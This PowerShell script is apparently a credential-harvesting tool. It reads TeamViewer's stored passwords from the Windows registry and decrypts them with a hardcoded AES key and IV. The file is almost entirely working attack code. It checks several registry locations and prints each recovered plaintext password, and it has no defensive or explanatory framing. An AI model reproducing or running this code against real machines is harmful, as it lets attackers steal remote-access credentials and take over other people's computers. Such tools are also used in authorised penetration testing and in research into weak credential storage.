function TeamviewerDecrypt
{
    Write-Host "Looking for Registry entries on this system:"
    if ((Test-Path Registry::'HKCU:\SOFTWARE\Teamviewer\') -Or (Test-Path Registry::'HKLM\SOFTWARE\WOW6432Node\TeamViewer') -Or (Test-Path Registry::'HKLM\SOFTWARE\TeamViewer'))
    {
        $success = $false
        if (Test-Path Registry::'HKCU:\SOFTWARE\Teamviewer\')
        {
            $TeamviewerDir = Get-ItemProperty Registry::HKCU\Software\Teamviewer\
            if ($TeamviewerDir.SecurityPasswordAES)
            {
                Write-Host "SecurityPasswordAES found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.SecurityPasswordAES
                $success = $true
            }
            elseif($TeamviewerDir.OptionsPasswordAES)
            {
                Write-Host "OptionsPasswordAES found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.OptionsPasswordAES
                $success = $true
            }
            elseif($TeamviewerDir.SecurityPasswordExported)
            {
                Write-Host "SecurityPasswordExported found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.SecurityPasswordExported
                $success = $true
            }
            elseif($TeamviewerDir.PermanentPassword)
            {
                Write-Host "PermanentPassword found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.PermanentPassword
                $success = $true
            }
        }
        elseif (Test-Path Registry::'HKLM\SOFTWARE\WOW6432Node\TeamViewer')
        {
            $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\WOW6432Node\TeamViewer
            if ($TeamviewerDir.SecurityPasswordAES)
            {
                Write-Host "SecurityPasswordAES found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.SecurityPasswordAES
                $success = $true
            }
            elseif($TeamviewerDir.OptionsPasswordAES)
            {
                Write-Host "OptionsPasswordAES found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.OptionsPasswordAES
                $success = $true
            }
            elseif($TeamviewerDir.SecurityPasswordExported)
            {
                Write-Host "SecurityPasswordExported found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.SecurityPasswordExported
                $success = $true
            }
            elseif($TeamviewerDir.PermanentPassword)
            {
                Write-Host "PermanentPassword found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.PermanentPassword
                $success = $true
            }
        }
        else
        {
            $TeamviewerDir = Get-ItemProperty Registry::HKLM\SOFTWARE\TeamViewer
            if ($TeamviewerDir.SecurityPasswordAES)
            {
                Write-Host "SecurityPasswordAES found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.SecurityPasswordAES
                $success = $true
            }
            elseif($TeamviewerDir.OptionsPasswordAES)
            {
                Write-Host "OptionsPasswordAES found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.OptionsPasswordAES
                $success = $true
            }
            elseif($TeamviewerDir.SecurityPasswordExported)
            {
                Write-Host "SecurityPasswordExported found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.SecurityPasswordExported
                $success = $true
            }
            elseif($TeamviewerDir.PermanentPassword)
            {
                Write-Host "PermanentPassword found, trying to decrypt:"
                decryptpass -encpass $TeamviewerDir.PermanentPassword
                $success = $true
            }
        }
        if ($success -eq $false)
        {
            Write-Host "Sorry, no passwords found"
        }
    }
    else
    {
       Write-Host "No Teamviewer installed, sorry"
    }

}

function decryptpass
{

    param(
        [byte[]]
        $encpass
    )
    function Create-AesManagedObject($key, $IV) {
        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        if ($IV) {
            if ($IV.getType().Name -eq "String") {
                $aesManaged.IV = [System.Convert]::FromBase64String($IV)
            }
            else {
                $aesManaged.IV = $IV
            }
        }
        if ($key) {
            if ($key.getType().Name -eq "String") {
                $aesManaged.Key = [System.Convert]::FromBase64String($key)
            }
            else {
                $aesManaged.Key = $key
            }
        }
        $aesManaged
    }
    
    function Decrypt-String($key, $encryptedStringWithIV) {
        $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
        $IV = $bytes[0..15]
        $aesManaged = Create-AesManagedObject $key $IV
        $decryptor = $aesManaged.CreateDecryptor();
        $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
        $aesManaged.Dispose()
        [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
    }
    
    [byte[]]$key = 0x06,0x02,0x00,0x00,0x00,0xa4,0x00,0x00,0x52,0x53,0x41,0x31,0x00,0x04,0x00,0x00
    [byte[]]$IV = 0x01,0x00,0x01,0x00,0x67,0x24,0x4F,0x43,0x6E,0x67,0x62,0xF2,0x5E,0xA8,0xD7,0x04
    [byte[]]$EncryptedBytes = $encpass
    $encryptedString = $IV + $EncryptedBytes
    $encryptedString = [System.Convert]::ToBase64String($encryptedString)
    $backToPlainText = Decrypt-String $key $encryptedString
    Write-Host "Decrypted Password is as follows:"
    $backToPlainText
}
